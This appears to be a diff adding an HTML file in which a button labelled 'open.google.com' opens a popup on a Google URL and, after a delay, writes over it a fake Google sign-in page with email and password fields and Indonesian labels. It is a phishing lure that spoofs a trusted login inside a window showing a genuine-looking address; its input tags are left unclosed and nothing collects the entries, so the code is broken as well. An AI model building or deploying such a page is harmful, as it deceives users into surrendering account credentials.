@@ -1,0 +1,103 @@
+
+
+<!DOCTYPE html>
+<html>
+<body>
+
+
+<button onclick="myFunction()">open.google.com</button>
+
+<script>
+function myFunction() {
+ var x = window.open("https://www.google.com/csi", "google.com:90", "width=400,height=300");
+
+ setTimeout(function(){x}, 1850)
+
+ setTimeout(function(){
+    x.document.write(`
+    <title>https://accounts.google.com</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0ebf8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .form-container {
+            background: white;
+            width: 360px;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 3px 8px rgba(0,0,0,0.15);
+        }
+
+        .form-title {
+            font-size: 24px;
+            color: #202124;
+            margin-bottom: 15px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            font-size: 15px;
+            border: 1px solid #dadce0;
+            border-radius: 6px;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        input:focus {
+            border: 2px solid #1a73e8;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background: #1664c4;
+        }
+    </style>
+
+
+<div class="form-container">
+        <div class="form-title">Login</div>
+
+        <div class="input-group">
+            <input type="text" placeholder="Email atau telepon"
+                   
+        </div>
+
+        <div class="input-group">
+            <input type="password" placeholder="Password"
+                   
+        </div>
+
+        <button>Masuk</button>
+    </div>
+
+    `);
+ }, 2400)
+}
+</script>
+
+</body>
+</html>
